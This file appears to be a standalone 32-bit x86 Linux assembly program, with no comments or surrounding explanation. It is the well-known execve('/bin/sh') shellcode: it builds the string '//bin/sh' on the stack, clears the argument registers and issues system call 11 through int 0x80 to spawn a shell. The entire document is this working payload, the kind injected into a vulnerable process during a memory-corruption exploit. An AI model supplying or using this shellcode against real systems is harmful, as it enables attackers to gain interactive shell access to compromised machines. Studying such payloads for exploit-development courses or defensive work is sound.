section .text
    global _start
_start:
    xor eax , eax
    push eax
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    mov ecx, eax
    mov edx, eax
    mov al, 0xb
    int 0x80
